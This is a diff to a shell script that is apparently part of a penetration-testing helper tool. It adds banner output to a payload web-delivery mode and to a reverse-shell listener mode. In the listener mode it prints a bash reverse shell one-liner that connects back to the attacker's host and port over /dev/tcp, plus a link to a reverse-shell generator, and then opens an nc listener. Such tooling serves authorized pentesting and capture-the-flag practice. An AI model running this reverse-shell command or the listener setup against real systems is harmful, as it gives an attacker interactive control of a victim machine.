@@ -13,7 +13,12 @@ if [ "$WEB_DELIVERY_MODE" ]; then
         fi
     fi
     cd $PROJECT_WEB_DELIVERY
-    python3 -m http.server 8890
+    export LISTEN_ON=8890
+    echo ""
+    echo "YOUR IP: $LHOST "
+    echo "YOUR URL: http://$LHOST:$LISTEN_ON "
+    echo ""
+    python3 -m http.server $LISTEN_ON
     exit 0
 fi 
 
@@ -28,6 +33,14 @@ if [ "$METASPLOIT_CONSOLE_MODE" ]; then
 fi
 
 if [ "$REVERSE_SHELL_MODE" ]; then
+    echo ""
+    echo "YOUR IP: $LHOST"
+    echo "YOUR Reverse Shell Port: $LPORT"
+    echo "Basic Revershell Command: "
+    echo "  /bin/bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
+    echo "Advanced: "
+    echo "  https://rev.eson.ninja/?ip=${LHOST}&port=${LPORT}"
+    echo ""
     rlwrap -I -cAr nc -lvvp ${LPORT}
     exit 0
 fi
